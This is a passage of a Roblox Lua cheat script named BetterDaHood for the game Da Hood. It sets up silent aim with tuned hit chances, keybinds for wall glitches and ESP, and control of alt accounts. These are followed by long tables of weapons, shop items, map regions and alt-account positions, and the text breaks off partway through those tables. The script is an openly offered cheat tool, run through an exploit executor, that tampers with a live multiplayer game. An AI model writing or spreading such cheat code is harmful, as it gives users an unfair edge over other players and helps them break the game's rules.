--[[

__**Premium V1.7.0**__
```
+ Compatibility update
```

--]]

--error("[BDH] Script disabled")
LPH_OBFUSCATED = false
--Settings
if not LPH_OBFUSCATED then
    getgenv().bdhSettings = { -- not done
        ["MainFpsCap"] = 160, -- not done
        ["Fov"] = 90, -- not done
        ["Macro_On"] = true, -- not done
        ["Keybinds"] = { -- not done
            ["Lay"] = "X", -- not done
            ["Greet"] = "C", -- not done
            ["Macro"] = "Q", -- not done
            ["WallGreetGlitch"] = "Z", -- not done
            ["WallGunGlitch"] = "F", -- not done
            ["ToggleESPMode"] = "V", -- not done
        }
    }

    --Silent aim settings ('P' key to toggle On/Off)
    getgenv().silentAimSettings = {
        Radius = 125,
        Prediction = 0.102421,
        WalkingHitChance = 45, -- % out of 100
        JumpingHitChance = 15, -- % out of 100
        KOed_Check = true,
        FriendCheck = true,
        CrewCheck = true,
    }

    --Alt Control Settings
    getgenv().mainId = 39131128 -- Put your main accounts user id here
    getgenv().altFps = 3 -- not done

    getgenv().alts = { -- Replace the 123s with your alt IDs (copy and paste line for more alts, max is 39) (make sure they are in numbered order)
        123,
    }
end

-- BetterDaHood
-- ------------
--

print("BetterDaHood ran")

--Services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local VirtualUser = game:GetService("VirtualUser")
local StarterGui = game:GetService("StarterGui")
local GroupService = game:GetService("GroupService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")
local Stats = game:GetService("Stats")
local ChatService = game:GetService("Chat")
local HttpService = game:GetService("HttpService")

--Module scripts
local mainModule = require(ReplicatedStorage:WaitForChild("MainModule"))

--Is game Da Hood?
while game.PlaceId == 0 do task.wait() end if game.PlaceId ~= 2788229376 and game.PlaceId ~= 7213786345 then error("[BetterDaHood] Game is not Da Hood, BDH will not run") end
--Is script already executed?
if getgenv().BetterDaHoodExecuted == true then error("[BetterDaHood] Script is already executed") end
getgenv().BetterDaHoodExecuted = true
--Wait for player to be added
while Players.LocalPlayer == nil do task.wait() end

--Consts
local PLAYER = Players.LocalPlayer
local MOUSE = PLAYER:GetMouse()
local DATA_FOLDER = PLAYER:WaitForChild("DataFolder")
local INFORMATION = DATA_FOLDER:WaitForChild("Information")
local INVENTORY = DATA_FOLDER:WaitForChild("Inventory")
local PLAYER_CREW = INFORMATION:FindFirstChild("Crew")
local PLAYER_CASH = PLAYER.DataFolder:WaitForChild("Currency")
local ORIGINAL_CASH_AMOUNT = PLAYER_CASH.Value
local REQUIRED_CHAR_PARTS = {
    ["Humanoid"] = true,
    ["HumanoidRootPart"] = true,
    ["UpperTorso"] = true,
    ["LowerTorso"] = true,
    ["Head"] = true,
}
local CASHIERS = workspace:WaitForChild("Cashiers")
local IGNORED = workspace:WaitForChild("Ignored")
local PLAYERS_FOLDER = workspace:WaitForChild("Players")
local ITEMS_DROP = IGNORED:WaitForChild("ItemsDrop")
local SHOP = IGNORED:WaitForChild("Shop")
local SHOPS = SHOP:GetChildren()
local SPAWN = IGNORED:WaitForChild("Spawn")
local LIGHTS = workspace:WaitForChild("Lights")
local MAP = workspace:WaitForChild("MAP")
local LOW_GFX_PARTS = {} -- [part] = originalMaterial
local MAIN_EVENT = ReplicatedStorage:WaitForChild("MainEvent")
local CHAT_EVENT = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local DefaultChatSystemChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local messageDoneFiltering = DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering")
local WEAPONS = { -- code weapon category
    --Guns
    ["[Rifle]"] = {["MaxAutoAmmo"] = 40, ["LayoutOrder"] = "1", ["ShopClickDetectors"] = {}},
    ["[Revolver]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    ["[Glock]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "5", ["ShopClickDetectors"] = {}},
    ["[Silencer]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "5", ["ShopClickDetectors"] = {}},
    ["[TacticalShotgun]"] = {["MaxAutoAmmo"] = 40, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    ["[P90]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "6", ["ShopClickDetectors"] = {}},
    ["[AUG]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "6", ["ShopClickDetectors"] = {}},
    ["[SMG]"] = {["MaxAutoAmmo"] = 200, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    ["[AR]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    ["[Shotgun]"] = {["MaxAutoAmmo"] = 40, ["LayoutOrder"] = "3", ["ShopClickDetectors"] = {}},
    ["[Double-Barrel SG]"] = {["MaxAutoAmmo"] = 40, ["LayoutOrder"] = "1", ["ShopClickDetectors"] = {}},
    ["[LMG]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "2", ["ShopClickDetectors"] = {}},
    ["[SilencerAR]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    ["[AK47]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    ["[DrumGun]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    --Special
    ["[SnowCannon]"] = {["LayoutOrder"] = "8"},
    ["[Flamethrower]"] = {["MaxAutoAmmo"] = 100, ["LayoutOrder"] = "0", ["ShopClickDetectors"] = {}},
    ["[RPG]"] = {["MaxAutoAmmo"] = 10, ["LayoutOrder"] = "0", ["ShopClickDetectors"] = {}},
    ["[GrenadeLauncher]"] = {["MaxAutoAmmo"] = 10, ["LayoutOrder"] = "1", ["ShopClickDetectors"] = {}},
    ["[Taser]"] = {["LayoutOrder"] = "4", ["ShopClickDetectors"] = {}},
    --Grenades
    ["[Flashbang]"] = {["LayoutOrder"] = "7"},
    ["[Grenade]"] = {["LayoutOrder"] = "7"},
    --Misc
    ["[Firework]"] = {["LayoutOrder"] = "7"},
    --Melee
    --["[Bat]"] = true,
    --["[Nunchucks]"] = true,
    --["[Pencil]"] = true,
    --["[Shovel]"] = true,
    --["[StopSign]"] = true,
    --["[SledgeHammer]"] = true,
    --["[PepperSpray]"] = true,
    --["[Knife]"] = true,
}
local FOODS = {
    ["[Chicken]"] = true,
    ["[Cranberry]"] = true,
    ["[Donut]"] = true,
    ["[Pizza]"] = true,
    ["[Popcorn]"] = true,
    ["[Lettuce]"] = true,
    ["[Taco]"] = true,
    ["[Lemonade]"] = true,
    ["[Starblox Latte]"] = true,
    ["[HotDog]"] = true,
    ["[Meat]"] = true,
    ["[Da Milk]"] = true,
}
local REQUIRED_ITEMS = {
	["[Flowers] - $5"] = 1,
	["[Glock] - $500"] = 1,
	["[Silencer] - $550"] = 1,
	["[Cranberry] - $3"] = 2,
	["[TacticalShotgun] - $1750"] = 1,
	["[P90] - $1000"] = 1,
	["[AUG] - $1950"] = 1,
	["[Knife] - $155"] = 2,
    ["[LockPicker] - $100"] = 11,
	["[PepperSpray] - $75"] = 1,
	["[Silencer] - $400"] = 1,
	["[Donut] - $5"] = 2,
	["[SMG] - $750"] = 1,
	["[AR] - $1000"] = 1,
	["[Shotgun] - $1250"] = 1,
	["[Pizza] - $5"] = 2,
	["[Chicken] - $7"] = 2,
	["[Taser] - $1000"] = 1,
	["[Weights] - $120"] = 1,
	["[HeavyWeights] - $250"] = 1,
	["[Popcorn] - $7"] = 2,
	["[RPG] - $20000"] = 1,
	["[Grenade] - $1250"] = 11,
	["[Camera] - $100"] = 1,
	["[Flashlight] - $10"] = 1,
	["[Double-Barrel SG] - $1400"] = 1,
	["[Flamethrower] - $25000"] = 1,
	["[Lettuce] - $5"] = 2,
	["[Revolver] - $1300"] = 1,
	--["[Surgeon Mask] - $25"] = 1,
	["[Pitchfork] - $320"] = 1,
	["[Taco] - $2"] = 2,
	["[Hamburger] - $5"] = 2,
	["[Lemonade] - $3"] = 2,
	["[SledgeHammer] - $350"] = 1,
	["[LMG] - $3750"] = 1,
	["[Starblox Latte] - $5"] = 2,
	["[StopSign] - $300"] = 1,
	["[SilencerAR] - $1250"] = 1,
	["[AK47] - $2250"] = 1,
	["[DrumGun] - $3000"] = 1,
	["[Money Gun] - $777"] = 1,
	["[Shovel] - $320"] = 1,
	["[BrownBag] - $25"] = 1,
	["[Flashbang] - $550"] = 2,
	["[PepperSpray] - $150"] = 1,
	["[GrenadeLauncher] - $10000"] = 1,
	["[Pencil] - $175"] = 1,
	["[Firework] - $10000"] = 1,
	["[Nunchucks] - $450"] = 1,
	["[HotDog] - $8"] = 2,
	["[Key] - $125"] = 1,
	["[Bat] - $250"] = 1,
    ["[Rifle] - $1550"] = 1,
    ["[Da Milk] - $7"] = 2,
    ["[Meat] - $12"] = 2,
}
local REGIONS = {
	{Name = 'Bank', Region = Region3.new(Vector3.new(-520.26, 18.25, -391.75), Vector3.new(-349.26, 100.25, -262.75))},
	{Name = 'Behind Bank', Region = Region3.new(Vector3.new(-564.26, 18.25, -391.75), Vector3.new(-520.26, 47.25, -193.75))},
	{Name = 'Bank alleyway', Region = Region3.new(Vector3.new(-520.26, 18.25, -262.75), Vector3.new(-417.26, 77.25, -235.75))},
	{Name = 'Bank', Region = Region3.new(Vector3.new(-417.26, 18.25, -262.75), Vector3.new(-346.26, 100.25, -136.75))},
	{Name = 'Bank rooftops', Region = Region3.new(Vector3.new(-349.26, 76.25, -320.75), Vector3.new(-297.26, 100.25, -185.75))},
	{Name = 'Bank chicken shop', Region = Region3.new(Vector3.new(-349.26, 18.25, -318.75), Vector3.new(-304.26, 76.25, -262.75))},
	{Name = 'Bank', Region = Region3.new(Vector3.new(-349.26, 18.25, -391.75), Vector3.new(-280.26, 100.25, -320.75))},
	{Name = 'Bank rooftops', Region = Region3.new(Vector3.new(-460.26, 76.25, -247.75), Vector3.new(-408.26, 100.25, -195.75))},
	{Name = 'Greenscreen', Region = Region3.new(Vector3.new(-542.26, 18.25, -234.75), Vector3.new(-460.26, 100.25, -195.75))},
	{Name = 'Rev', Region = Region3.new(Vector3.new(-676.26, 18.25, -193.75), Vector3.new(-564.26, 100.25, -66.75))},
	{Name = 'Jewelery store', Region = Region3.new(Vector3.new(-761.26, 18.25, -391.75), Vector3.new(-564.26, 100.25, -193.75))},
	{Name = 'Furniture store', Region = Region3.new(Vector3.new(-564.26, 18.25, -195.75), Vector3.new(-417.26, 100.25, -66.75))},
	{Name = 'Tunnels', Region = Region3.new(Vector3.new(-431.26, -34.75, -107.75), Vector3.new(-411.26, 18.25, 21.25))},
	{Name = 'Tunnels', Region = Region3.new(Vector3.new(-760.26, -34.75, 22.25), Vector3.new(-178.26, 14.25, 144.25))},
	{Name = 'Tunnels', Region = Region3.new(Vector3.new(-230.26, -34.75, 111.25), Vector3.new(-140.26, 18.25, 390.25))},
	{Name = 'Tunnels', Region = Region3.new(Vector3.new(-844.26, -34.75, 144.25), Vector3.new(-698.26, -7.75, 259.25))},
	{Name = 'Swamp', Region = Region3.new(Vector3.new(-1076.26, -65.75, -33.75), Vector3.new(-801.26, 136.25, 597.25))},
	{Name = 'School', Region = Region3.new(Vector3.new(-801.26, 12.25, 83.25), Vector3.new(-236.26, 156.25, 458.25))},
	{Name = 'Prison tunnels', Region = Region3.new(Vector3.new(-236.26, 31.25, 76.25), Vector3.new(-124.26, 71.25, 189.25))},
	{Name = 'Prison tunnels', Region = Region3.new(Vector3.new(-279.26, 14.25, 14.25), Vector3.new(14.74, 73.25, 75.25))},
	{Name = 'Prison tunnels', Region = Region3.new(Vector3.new(-19.26, 14.25, -74.75), Vector3.new(14.74, 73.25, 14.25))},
	{Name = 'Barber shop', Region = Region3.new(Vector3.new(-52.26, 14.25, -202.75), Vector3.new(69.74, 119.25, -74.76))},
	{Name = 'Flame', Region = Region3.new(Vector3.new(-196.26, 14.25, -186.75), Vector3.new(-52.26, 119.25, -74.76))},
	{Name = 'Police station', Region = Region3.new(Vector3.new(-349.26, 14.25, -186.75), Vector3.new(-196.26, 119.25, 12.25))},
	{Name = 'Graveyard', Region = Region3.new(Vector3.new(69.74, 14.25, -265.75), Vector3.new(331.74, 119.25, 141.25))},
	{Name = 'Gas station', Region = Region3.new(Vector3.new(331.74, 14.25, -255.75), Vector3.new(700.74, 133.25, -23.75))},
	{Name = 'Bank road', Region = Region3.new(Vector3.new(-417.26, 18.25, -136.75), Vector3.new(-349.26, 100.25, 12.25))},
	{Name = 'School', Region = Region3.new(Vector3.new(-801.26, 18.25, 12.25), Vector3.new(-275.26, 156.25, 83.25))},
	{Name = 'Gas station', Region = Region3.new(Vector3.new(447.74, 14.25, -323.75), Vector3.new(667.74, 133.25, -255.75))},
	{Name = 'Park', Region = Region3.new(Vector3.new(130.74, 14.25, -542.75), Vector3.new(447.74, 142.25, -255.75))},
	{Name = 'Taco shop', Region = Region3.new(Vector3.new(447.74, 14.25, -542.75), Vector3.new(695.74, 142.25, -323.75))},
	{Name = 'Uphill armor', Region = Region3.new(Vector3.new(512.74, 14.25, -784.75), Vector3.new(703.74, 142.25, -542.75))},
	{Name = 'Uphill guns', Region = Region3.new(Vector3.new(431.74, 14.25, -638.75), Vector3.new(512.74, 142.25, -542.75))},
	{Name = 'Uphill chicken shop', Region = Region3.new(Vector3.new(130.74, 14.25, -638.75), Vector3.new(431.74, 142.25, -542.75))},
	{Name = 'Uphill', Region = Region3.new(Vector3.new(310.74, 39.25, -951.75), Vector3.new(512.74, 142.25, -638.75))},
	{Name = 'Carnival', Region = Region3.new(Vector3.new(310.74, -24.75, -1198.75), Vector3.new(357.74, 142.25, -951.75))},
	{Name = 'Carnival', Region = Region3.new(Vector3.new(-74.26, 1.25, -1166.75), Vector3.new(310.74, 142.25, -759.75))},
	{Name = 'Phone shop road', Region = Region3.new(Vector3.new(-297.26, -4.75, -1192.75), Vector3.new(-74.26, 142.25, -856.75))},
	{Name = 'Sandbox', Region = Region3.new(Vector3.new(-330.26, -4.75, -856.75), Vector3.new(-17.26, 142.25, -662.75))},
	{Name = 'Downhill', Region = Region3.new(Vector3.new(-651.26, 2.25, -970.75), Vector3.new(-330.26, 142.25, -615.75))},
	{Name = 'Gym', Region = Region3.new(Vector3.new(-280.26, -4.75, -662.75), Vector3.new(17.74, 142.25, -569.75))},
	{Name = 'Hospital', Region = Region3.new(Vector3.new(17.74, -4.75, -586.75), Vector3.new(130.74, 142.25, -333.75))},
	{Name = 'Carnival tunnel', Region = Region3.new(Vector3.new(17.74, -4.75, -759.75), Vector3.new(130.74, 142.25, -586.75))},
	{Name = 'Gym', Region = Region3.new(Vector3.new(-147.26, -4.75, -569.75), Vector3.new(17.74, 142.25, -376.75))},
	{Name = 'Flower shop', Region = Region3.new(Vector3.new(-147.26, 12.25, -376.75), Vector3.new(17.74, 142.25, -291.75))},
	{Name = 'Flower shop backgarden', Region = Region3.new(Vector3.new(-147.26, 12.25, -291.75), Vector3.new(15.74, 142.25, -185.75))},
	{Name = 'Firestation road', Region = Region3.new(Vector3.new(-196.26, -4.75, -321.75), Vector3.new(-147.26, 142.25, -185.75))},
	{Name = 'Lockpick', Region = Region3.new(Vector3.new(-298.26, -4.75, -321.75), Vector3.new(-196.26, 142.25, -185.75))},
	{Name = 'Shoe shop', Region = Region3.new(Vector3.new(-280.26, 17.25, -437.75), Vector3.new(-147.26, 142.25, -321.75))},
	{Name = 'Nightclub', Region = Region3.new(Vector3.new(-280.26, -12.75, -569.75), Vector3.new(-147.26, 142.25, -437.75))},
	{Name = 'Nightclub', Region = Region3.new(Vector3.new(-323.26, -9.75, -569.75), Vector3.new(-207.26, 17.25, -287.75))},
	{Name = 'Bank houses', Region = Region3.new(Vector3.new(-664.26, -12.75, -615.75), Vector3.new(-280.26, 142.25, -391.75))},
	{Name = 'Lava base', Region = Region3.new(Vector3.new(-1093.26, -544.75, -1313.75), Vector3.new(-419.26, 2.25, -615.75))},
	{Name = 'Skate park', Region = Region3.new(Vector3.new(-848.26, -12.75, -682.75), Vector3.new(-664.26, 142.25, -386.75))},
	{Name = 'DB', Region = Region3.new(Vector3.new(-1072.26, -12.75, -386.75), Vector3.new(-971.26, 142.25, -207.75))},
	{Name = 'DB construction site', Region = Region3.new(Vector3.new(-971.26, -12.75, -386.75), Vector3.new(-889.26, 142.25, -207.75))},
	{Name = 'Firework', Region = Region3.new(Vector3.new(-889.26, -12.75, -386.75), Vector3.new(-761.26, 142.25, -207.75))},
	{Name = 'Casino', Region = Region3.new(Vector3.new(-933.26, -12.75, -207.75), Vector3.new(-755.26, 142.25, -46.75))},
	{Name = 'Cinema', Region = Region3.new(Vector3.new(-1070.26, -12.75, -207.75), Vector3.new(-933.26, 142.25, -46.75))},
	{Name = 'Casino tunnel', Region = Region3.new(Vector3.new(-818.26, -12.75, -46.75), Vector3.new(-755.26, 142.25, 17.24))},
	{Name = 'Rev tunnel', Region = Region3.new(Vector3.new(-663.26, -12.75, -66.75), Vector3.new(-600.26, 142.25, 11.25))},
	{Name = 'Basketball', Region = Region3.new(Vector3.new(-1047.26, -12.75, -664.75), Vector3.new(-848.26, 142.25, -386.75))},
	{Name = 'Tunnels', Region = Region3.new(Vector3.new(-140.26, -82.75, -263.75), Vector3.new(242.74, 10.25, 381.25))},
	{Name = 'RPG Tunnel', Region = Region3.new(Vector3.new(-83.26, 4.25, -472.76), Vector3.new(-39.26, 18.25, -421.76))},
}

local ALT_SETUP_LOCATIONS_V2 = {
    ["admin"] = {
        [1] = Vector3.new(-828.01, -39.9, -556),
        [2] = Vector3.new(-828.01, -39.9, -568),
        [3] = Vector3.new(-828.01, -39.9, -580),
        [4] = Vector3.new(-828.01, -39.9, -592),
        [5] = Vector3.new(-828.01, -39.9, -604),
        [6] = Vector3.new(-828.01, -39.9, -616),
        [7] = Vector3.new(-845.01, -39.9, -556),
        [8] = Vector3.new(-845.01, -39.9, -568),
        [9] = Vector3.new(-845.01, -39.9, -580),
        [10] = Vector3.new(-845.01, -39.9, -592),
        [11] = Vector3.new(-845.01, -39.9, -604),
        [12] = Vector3.new(-845.01, -39.9, -616),
        [13] = Vector3.new(-862.01, -39.9, -556),
        [14] = Vector3.new(-862.01, -39.9, -568),
        [15] = Vector3.new(-862.01, -39.9, -580),
        [16] = Vector3.new(-862.01, -39.9, -592),
        [17] = Vector3.new(-862.01, -39.9, -604),
        [18] = Vector3.new(-862.01, -39.9, -616),
        [19] = Vector3.new(-880.01, -39.9, -556),
        [20] = Vector3.new(-880.01, -39.9, -568),
        [21] = Vector3.new(-880.01, -39.9, -580),
        [22] = Vector3.new(-880.01, -39.9, -592),
        [23] = Vector3.new(-880.01, -39.9, -604),
        [24] = Vector3.new(-880.01, -39.9, -616),
        [25] = Vector3.new(-897.01, -39.9, -556),
        [26] = Vector3.new(-897.01, -39.9, -568),
        [27] = Vector3.new(-897.01, -39.9, -580),
        [28] = Vector3.new(-897.01, -39.9, -592),
        [29] = Vector3.new(-897.01, -39.9, -604),
        [30] = Vector3.new(-897.01, -39.9, -616),
        [31] = Vector3.new(-914.01, -39.9, -556),
        [32] = Vector3.new(-914.01, -39.9, -568),
        [33] = Vector3.new(-914.01, -39.9, -580),
        [34] = Vector3.new(-914.01, -39.9, -592),
        [35] = Vector3.new(-914.01, -39.9, -604),
        [36] = Vector3.new(-914.01, -39.9, -616),
        [37] = Vector3.new(-871.01, -38.9, -610),
        [38] = Vector3.new(-871.01, -38.9, -586),
        [39] = Vector3.new(-871.01, -38.9, -562),
    },
    ["bank"] = {
		[1] = Vector3.new(-393.01, 21.75, -338),
		[2] = Vector3.new(-381.01, 21.75, -338),
		[3] = Vector3.new(-369.01, 21.75, -338),
		[4] = Vector3.new(-357.01, 21.75, -338),
		[5] = Vector3.new(-393.01, 21.75, -325),
		[6] = Vector3.new(-381.01, 21.75, -325),
		[7] = Vector3.new(-369.01, 21.75, -325),
		[8] = Vector3.new(-357.01, 21.75, -325),
		[9] = Vector3.new(-393.01, 21.75, -312),
		[10] = Vector3.new(-381.01, 21.75, -312),
		[11] = Vector3.new(-369.01, 21.75, -312),
		[12] = Vector3.new(-357.01, 21.75, -312),
		[13] = Vector3.new(-393.01, 21.75, -299),
		[14] = Vector3.new(-381.01, 21.75, -299),
		[15] = Vector3.new(-369.01, 21.75, -299),
		[16] = Vector3.new(-357.01, 21.75, -299),
		[17] = Vector3.new(-393.01, 21.75, -286),
		[18] = Vector3.new(-381.01, 21.75, -286),
		[19] = Vector3.new(-369.01, 21.75, -286),
		[20] = Vector3.new(-357.01, 21.75, -286),
		[21] = Vector3.new(-393.01, 21.75, -273),
		[22] = Vector3.new(-381.01, 21.75, -273),
		[23] = Vector3.new(-369.01, 21.75, -273),
		[24] = Vector3.new(-357.01, 21.75, -273),
		[25] = Vector3.new(-393.01, 21.75, -260),
		[26] = Vector3.new(-381.01, 21.75, -260),
		[27] = Vector3.new(-369.01, 21.75, -260),
		[28] = Vector3.new(-357.01, 21.75, -260),
		[29] = Vector3.new(-393.01, 21.75, -247),
		[30] = Vector3.new(-381.01, 21.75, -247),
		[31] = Vector3.new(-369.01, 21.75, -247),
		[32] = Vector3.new(-357.01, 21.75, -247),
		[33] = Vector3.new(-393.01, 21.75, -233),
		[34] = Vector3.new(-381.01, 21.75, -233),
		[35] = Vector3.new(-369.01, 21.75, -233),
		[36] = Vector3.new(-357.01, 21.75, -233),
		[37] = Vector3.new(-405.01, 21.75, -299),
		[38] = Vector3.new(-405.01, 21.75, -286),
		[39] = Vector3.new(-405.01, 21.75, -273),
	},
    ["club"] = {
        [1] = Vector3.new(-236.01, -6.9, -411),
        [2] = Vector3.new(-248.01, -6.9, -411),
        [3] = Vector3.new(-260.01, -6.9, -411),
        [4] = Vector3.new(-272.01, -6.9, -411),
        [5] = Vector3.new(-284.01, -6.9, -411),
        [6] = Vector3.new(-296.01, -6.9, -411),
        [7] = Vector3.new(-236.01, -6.9, -398),
        [8] = Vector3.new(-248.01, -6.9, -398),
        [9] = Vector3.new(-260.01, -6.9, -398),
        [10] = Vector3.new(-272.01, -6.9, -398),
        [11] = Vector3.new(-284.01, -6.9, -398),
        [12] = Vector3.new(-296.01, -6.9, -398),
        [13] = Vector3.new(-236.01, -6.9, -385),
        [14] = Vector3.new(-248.01, -6.9, -385),
        [15] = Vector3.new(-260.01, -6.9, -385),
        [16] = Vector3.new(-272.01, -6.9, -385),
        [17] = Vector3.new(-284.01, -6.9, -385),
        [18] = Vector3.new(-296.01, -6.9, -385),
        [19] = Vector3.new(-236.01, -6.9, -372),
        [20] = Vector3.new(-248.01, -6.9, -372),
        [21] = Vector3.new(-260.01, -6.9, -372),
        [22] = Vector3.new(-272.01, -6.9, -372),
        [23] = Vector3.new(-284.01, -6.9, -372),
        [24] = Vector3.new(-296.01, -6.9, -372),
        [25] = Vector3.new(-236.01, -6.9, -359),
        [26] = Vector3.new(-248.01, -6.9, -359),
        [27] = Vector3.new(-260.01, -6.9, -359),
        [28] = Vector3.new(-272.01, -6.9, -359),
        [29] = Vector3.new(-284.01, -6.9, -359),
        [30] = Vector3.new(-296.01, -6.9, -359),
        [31] = Vector3.new(-236.01, -6.9, -346),
        [32] = Vector3.new(-248.01, -6.9, -346),
        [33] = Vector3.new(-260.01, -6.9, -346),
        [34] = Vector3.new(-272.01, -6.9, -346),
        [35] = Vector3.new(-284.01, -6.9, -346),
        [36] = Vector3.new(-296.01, -6.9, -346),
        [37] = Vector3.new(-266.01, -6.9, -355),
        [38] = Vector3.new(-266.01, -6.9, -379),
        [39] = Vector3.new(-266.01, -6.9, -403),
    },
    ["train"] = {
        [1] = Vector3.new(684.99, 34.1, -149),
        [2] = Vector3.new(674.99, 34.1, -149),
        [3] = Vector3.new(664.99, 34.1, -149),
        [4] = Vector3.new(654.99, 34.1, -149),
        [5] = Vector3.new(644.99, 34.1, -149),
        [6] = Vector3.new(634.99, 34.1, -149),
        [7] = Vector3.new(624.99, 34.1, -149),
        [8] = Vector3.new(614.99, 34.1, -149),
        [9] = Vector3.new(604.99, 34.1, -149),
        [10] = Vector3.new(596.45, 34.1, -143.06),
        [11] = Vector3.new(589.38, 34.1, -135.98),
        [12] = Vector3.new(582.31, 34.1, -128.91),
        [13] = Vector3.new(575.24, 34.1, -121.84),
        [14] = Vector3.new(568.17, 34.1, -114.77),
        [15] = Vector3.new(561.99, 34.1, -107),
        [16] = Vector3.new(561.99, 34.1, -97),
        [17] = Vector3.new(561.99, 34.1, -87),
        [18] = Vector3.new(561.99, 34.1, -77),
        [19] = Vector3.new(561.99, 34.1, -67),
        [20] = Vector3.new(561.99, 34.1, -57),
        [21] = Vector3.new(664.99, 47.1, -54),
        [22] = Vector3.new(652.99, 47.1, -54),
        [23] = Vector3.new(640.99, 47.1, -54),
        [24] = Vector3.new(628.99, 47.1, -54),
        [25] = Vector3.new(616.99, 47.1, -54),
        [26] = Vector3.new(604.99, 47.1, -54),
        [27] = Vector3.new(664.99, 47.1, -79),
        [28] = Vector3.new(652.99, 47.1, -79),
        [29] = Vector3.new(640.99, 47.1, -79),
        [30] = Vector3.new(628.99, 47.1, -79),
        [31] = Vector3.new(616.99, 47.1, -79),
        [32] = Vector3.new(604.99, 47.1, -79),
        [33] = Vector3.new(664.99, 47.1, -104),
        [34] = Vector3.new(652.99, 47.1, -104),
        [35] = Vector3.new(640.99, 47.1, -104),
        [36] = Vector3.new(628.99, 47.1, -104),
        [37] = Vector3.new(616.99, 47.1, -104),
        [38] = Vector3.new(604.99, 47.1, -104),
        [39] = Vector3.new(586.99, 47.1, -79),
    },
    ["swamp"] = {
        [1] = Vector3.new(-867.01, -33.9, 263),
        [2] = Vector3.new(-879.01, -33.9, 263),
        [3] = Vector3.new(-891.01, -33.9, 263),
        [4] = Vector3.new(-903.01, -33.9, 263),
        [5] = Vector3.new(-915.01, -33.9, 263),
        [6] = Vector3.new(-927.01, -33.9, 263),
        [7] = Vector3.new(-867.01, -33.9, 276),
        [8] = Vector3.new(-879.01, -33.9, 276),
        [9] = Vector3.new(-891.01, -33.9, 276),
        [10] = Vector3.new(-903.01, -33.9, 276),
        [11] = Vector3.new(-915.01, -33.9, 276),
        [12] = Vector3.new(-927.01, -33.9, 276),
        [13] = Vector3.new(-867.01, -33.9, 289),
        [14] = Vector3.new(-879.01, -33.9, 289),
        [15] = Vector3.new(-891.01, -33.9, 289),
        [16] = Vector3.new(-903.01, -33.9, 289),
        [17] = Vector3.new(-915.01, -33.9, 289),
        [18] = Vector3.new(-927.01, -33.9, 289),
        [19] = Vector3.new(-867.01, -33.9, 302),
        [20] = Vector3.new(-879.01, -33.9, 302),
        [21] = Vector3.new(-891.01, -33.9, 302),
        [22] = Vector3.new(-903.01, -33.9, 302),
        [23] = Vector3.new(-915.01, -33.9, 302),
        [24] = Vector3.new(-927.01, -31.9, 302),
        [25] = Vector3.new(-867.01, -33.9, 315),
        [26] = Vector3.new(-879.01, -33.9, 315),
        [27] = Vector3.new(-891.01, -33.9, 315),
        [28] = Vector3.new(-903.01, -33.9, 315),
        [29] = Vector3.new(-915.01, -33.9, 315),
        [30] = Vector3.new(-927.01, -33.9, 315),
        [31] = Vector3.new(-867.01, -33.9, 328),
        [32] = Vector3.new(-879.01, -33.9, 328),
        [33] = Vector3.new(-891.01, -33.9, 328),
        [34] = Vector3.new(-903.01, -33.9, 328),
        [35] = Vector3.new(-915.01, -33.9, 328),
        [36] = Vector3.new(-927.01, -33.9, 328),
        [37] = Vector3.new(-920.01, -33.9, 334),
        [38] = Vector3.new(-896.01, -33.9, 334),
        [39] = Vector3.new(-872.01, -33.9, 334),
    },
    ["vault"] = {
        [1] = Vector3.new(-496.13, 22.63, -278.12),
        [2] = Vector3.new(-500.13, 22.64, -278.12),
        [3] = Vector3.new(-504.13, 22.65, -278.12),
        [4] = Vector3.new(-508.13, 22.66, -278.12),
        [5] = Vector3.new(-512.13, 22.68, -278.12),
        [6] = Vector3.new(-516.13, 22.69, -278.12),
        [7] = Vector3.new(-496.13, 22.63, -281.12),
        [8] = Vector3.new(-500.13, 22.64, -281.12),
        [9] = Vector3.new(-504.13, 22.65, -281.12),
        [10] = Vector3.new(-508.13, 22.66, -281.12),
        [11] = Vector3.new(-512.13, 22.68, -281.12),
        [12] = Vector3.new(-516.13, 22.69, -281.12),
        [13] = Vector3.new(-496.13, 22.63, -284.12),
        [14] = Vector3.new(-500.13, 22.64, -284.12),
        [15] = Vector3.new(-504.13, 22.65, -284.12),
        [16] = Vector3.new(-508.13, 22.66, -284.12),
        [17] = Vector3.new(-512.13, 22.68, -284.12),
        [18] = Vector3.new(-516.13, 22.69, -284.12),
        [19] = Vector3.new(-496.13, 22.63, -287.12),
        [20] = Vector3.new(-500.13, 22.64, -287.12),
        [21] = Vector3.new(-504.13, 22.65, -287.12),
        [22] = Vector3.new(-508.13, 22.66, -287.12),
        [23] = Vector3.new(-512.13, 22.68, -287.12),
        [24] = Vector3.new(-516.13, 22.69, -287.12),
        [25] = Vector3.new(-496.13, 22.63, -290.12),
        [26] = Vector3.new(-500.13, 22.64, -290.12),
        [27] = Vector3.new(-504.13, 22.65, -290.12),
        [28] = Vector3.new(-508.13, 22.66, -290.12),
        [29] = Vector3.new(-512.13, 22.68, -290.12),
        [30] = Vector3.new(-516.13, 22.69, -290.12),
        [31] = Vector3.new(-496.13, 22.63, -293.12),
        [32] = Vector3.new(-500.13, 22.64, -293.12),
        [33] = Vector3.new(-504.13, 22.65, -293.12),
